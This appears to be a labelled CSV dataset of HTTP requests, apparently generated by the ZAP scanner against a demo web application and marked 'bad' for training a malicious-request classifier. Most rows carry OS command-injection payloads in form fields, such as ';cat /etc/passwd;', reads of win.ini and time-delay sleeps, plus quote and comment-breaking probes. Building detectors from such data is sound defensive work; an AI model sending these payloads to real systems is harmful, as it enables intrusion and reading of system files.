method,path,body,single_q,double_q,dashes,braces,spaces,badwords_count,class
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%3Bsleep+15.0%3B&comments=&submit=+Submit+',0,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%26sleep+15.0%26%22&comments=&submit=+Submit+',0,2,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%3Bsleep+15.0%3B%22&comments=&submit=+Submit+',0,2,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%26sleep+15.0%26%27&comments=&submit=+Submit+',2,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%3Bsleep+15.0%3B%27&comments=&submit=+Submit+',2,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=type+%25SYSTEMROOT%25%5Cwin.ini&comments=&submit=+Submit+',0,0,0,0,3,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%26type+%25SYSTEMROOT%25%5Cwin.ini&comments=&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&comments=&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&comments=&submit=+Submit+',0,2,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&comments=&submit=+Submit+',0,1,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&comments=&submit=+Submit+',2,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&comments=&submit=+Submit+',1,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%26timeout+%2FT+15.0&comments=&submit=+Submit+',0,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%7Ctimeout+%2FT+15.0&comments=&submit=+Submit+',0,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%26timeout+%2FT+15.0%26%22&comments=&submit=+Submit+',0,2,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%7Ctimeout+%2FT+15.0&comments=&submit=+Submit+',0,1,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%26timeout+%2FT+15.0%26%27&comments=&submit=+Submit+',2,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%7Ctimeout+%2FT+15.0&comments=&submit=+Submit+',1,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=get-help&comments=&submit=+Submit+',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%3Bget-help&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%3Bget-help&comments=&submit=+Submit+',0,1,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%3Bget-help&comments=&submit=+Submit+',1,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%3Bget-help+%23&comments=&submit=+Submit+',0,0,0,0,8,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%22%3Bstart-sleep+-s+15.0',b'',0,1,0,0,2,1,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%27%3Bstart-sleep+-s+15.0',b'',1,0,0,0,2,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%3Bstart-sleep+-s+15.0&comments=&submit=+Submit+',0,0,0,0,9,1,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=MortgageLendingAccountExecutive%3ASales%3Bstart-sleep+-s+15.0+%23',b'',0,0,0,0,3,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%22%3Bstart-sleep+-s+15.0&comments=&submit=+Submit+',0,1,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%27%3Bstart-sleep+-s+15.0&comments=&submit=+Submit+',1,0,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.%3Bstart-sleep+-s+15.0+%23&comments=&submit=+Submit+',0,0,0,0,10,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=cat+%2Fetc%2Fpasswd&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%26cat+%2Fetc%2Fpasswd%26&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%3Bcat+%2Fetc%2Fpasswd%3B&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%26cat+%2Fetc%2Fpasswd%26%22&submit=+Submit+',0,2,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%3Bcat+%2Fetc%2Fpasswd%3B%22&submit=+Submit+',0,2,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%26cat+%2Fetc%2Fpasswd%26%27&submit=+Submit+',2,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%3Bcat+%2Fetc%2Fpasswd%3B%27&submit=+Submit+',2,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%26sleep+15.0%26&submit=+Submit+',0,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%3Bsleep+15.0%3B&submit=+Submit+',0,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%26sleep+15.0%26%22&submit=+Submit+',0,2,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%3Bsleep+15.0%3B%22&submit=+Submit+',0,2,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%26sleep+15.0%26%27&submit=+Submit+',2,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%3Bsleep+15.0%3B%27&submit=+Submit+',2,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=type+%25SYSTEMROOT%25%5Cwin.ini&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%26type+%25SYSTEMROOT%25%5Cwin.ini&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&submit=+Submit+',0,2,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&submit=+Submit+',0,1,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&submit=+Submit+',2,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&submit=+Submit+',1,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%26timeout+%2FT+15.0&submit=+Submit+',0,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%7Ctimeout+%2FT+15.0&submit=+Submit+',0,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%26timeout+%2FT+15.0%26%22&submit=+Submit+',0,2,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%7Ctimeout+%2FT+15.0&submit=+Submit+',0,1,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%26timeout+%2FT+15.0%26%27&submit=+Submit+',2,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%7Ctimeout+%2FT+15.0&submit=+Submit+',1,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=get-help&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%3Bget-help&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%3Bget-help&submit=+Submit+',0,1,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%3Bget-help&submit=+Submit+',1,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%3Bget-help+%23&submit=+Submit+',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%3Bstart-sleep+-s+15.0&submit=+Submit+',0,0,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%22%3Bstart-sleep+-s+15.0&submit=+Submit+',0,1,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%27%3Bstart-sleep+-s+15.0&submit=+Submit+',1,0,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%3Bstart-sleep+-s+15.0+%23&submit=+Submit+',0,0,0,0,10,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=cat+%2Fetc%2Fpasswd',0,0,0,0,6,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%26cat+%2Fetc%2Fpasswd%26',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%3Bcat+%2Fetc%2Fpasswd%3B',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%26cat+%2Fetc%2Fpasswd%26%22',0,2,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%3Bcat+%2Fetc%2Fpasswd%3B%22',0,2,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%26cat+%2Fetc%2Fpasswd%26%27',2,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%3Bcat+%2Fetc%2Fpasswd%3B%27',2,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%26sleep+15.0%26',0,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%3Bsleep+15.0%3B',0,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%26sleep+15.0%26%22',0,2,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%3Bsleep+15.0%3B%22',0,2,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%26sleep+15.0%26%27',2,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%3Bsleep+15.0%3B%27',2,0,0,0,8,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=type+%25SYSTEMROOT%25%5Cwin.ini',0,0,0,0,6,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%26type+%25SYSTEMROOT%25%5Cwin.ini',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%7Ctype+%25SYSTEMROOT%25%5Cwin.ini',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22',0,2,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini',0,1,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27',2,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini',1,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%26timeout+%2FT+15.0',0,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%7Ctimeout+%2FT+15.0',0,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%26timeout+%2FT+15.0%26%22',0,2,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%7Ctimeout+%2FT+15.0',0,1,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%26timeout+%2FT+15.0%26%27',2,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%7Ctimeout+%2FT+15.0',1,0,0,0,9,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=get-help',0,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%3Bget-help',0,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%3Bget-help',0,1,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%3Bget-help',1,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%3Bget-help+%23',0,0,0,0,8,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%3Bstart-sleep+-s+15.0',0,0,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%22%3Bstart-sleep+-s+15.0',0,1,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%27%3Bstart-sleep+-s+15.0',1,0,0,0,9,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+%3Bstart-sleep+-s+15.0+%23',0,0,0,0,10,1,bad
POST,b'/sendFeedback',b'cfile=%22%27&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',1,1,0,0,7,0,bad
POST,b'/doLogin',b'uid=%22%27&passw=ZAP&btnSubmit=Login',1,1,0,0,0,1,bad
POST,b'/doSubscribe',b'txtEmail=%22%27&btnSubmit=Subscribe',1,1,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=%3C%21--&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,1,0,7,0,bad
POST,b'/doLogin',b'uid=%3C%21--&passw=ZAP&btnSubmit=Login',0,0,1,0,0,1,bad
POST,b'/doSubscribe',b'txtEmail=%3C%21--&btnSubmit=Subscribe',0,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=%5D%5D%3E&passw=ZAP&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Privacypolicy.jsp?sec=%22%27&template=US',b'',1,1,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=%5D%5D%3E&btnSubmit=Subscribe',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=%5D%5D%3E&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%22%27',b'',1,1,0,0,0,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=%22%27',1,1,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%22%27&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',1,1,0,0,7,0,bad
GET,b'/default.jsp?content=%22%27',b'',1,1,0,0,0,0,bad
GET,b'/disclaimer.htm?url=%22%27',b'',1,1,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=%3C%21--&template=US',b'',0,0,1,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%3C%21--',b'',0,0,1,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=%22%27&btnSubmit=Login',1,1,0,0,0,1,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=%3C%21--',0,0,1,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%3C%21--&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,1,0,7,0,bad
GET,b'/default.jsp?content=%3C%21--',b'',0,0,1,0,0,0,bad
GET,b'/disclaimer.htm?url=%3C%21--',b'',0,0,1,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=%5D%5D%3E&template=US',b'',0,0,0,0,0,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%5D%5D%3E',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=%3C%21--&btnSubmit=Login',0,0,1,0,0,1,bad
GET,b'/index.jsp?content=%22%27&job=MortgageLendingAccountExecutive%3ASales',b'',1,1,0,0,0,0,bad
GET,b'/index.jsp?content=%22%27',b'',1,1,0,0,0,0,bad
GET,b'/images/index.jsp?content=%22%27',b'',1,1,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%5D%5D%3E&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=%5D%5D%3E',0,0,0,0,0,0,bad
GET,b'/disclaimer.htm?url=%5D%5D%3E',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%22%27',b'',1,1,0,0,0,0,bad
GET,b'/default.jsp?content=%5D%5D%3E',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=%5D%5D%3E&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/index.jsp?content=%3C%21--',b'',0,0,1,0,0,0,bad
